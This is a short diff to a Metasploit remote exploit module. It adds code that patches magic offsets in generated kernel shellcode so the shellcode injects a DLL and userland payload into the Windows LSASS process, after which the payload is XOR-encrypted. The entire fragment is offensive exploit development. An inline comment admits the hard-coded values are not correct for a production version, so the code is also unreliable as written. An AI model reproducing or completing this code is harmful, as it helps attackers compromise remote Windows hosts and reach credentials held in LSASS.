@@ -191,7 +191,18 @@ class MetasploitModule < Msf::Exploit::Remote
       	print_status("Generating kernel shellcode with #{datastore['PAYLOAD']}")
       	shellcode = make_kernel_user_payload(payload_exe)
       	print_status("Total payload length: #{shellcode.length} bytes")
+        
+	#Edit Shellcode 3 times
+	    
+	#Update this; this is NOT correct for production version
+	#Calculate the Size of DLL + EXE + 4 bit DWORD in between
+	shellcode[2166+0xF82] = 0x50D800; #SizeOfTheDLL ( with the EXE Payload )
+	shellcode[2166+0xF86] = 1; # DLL ordinal to call
 
+	#Patch the Kernel mode shellcode with the value of the DLL + Userland Shellcode for memory alloc purposes
+	shellcode[2158] = 0x50D800 + 3978; #Size of the DLL + Size Userland Shellcode
+	#this value must be correct for the kernel mode shellcode to inject the DLL + Userland shellcode in the userland process ( LSASS )
+	    
       	print_status("Encrypting shellcode with XOR key 0x#{@xor_key.to_s(16).upcase}")
       	xor_shellcode = Rex::Text.xor([@xor_key].pack('V'), shellcode)
 
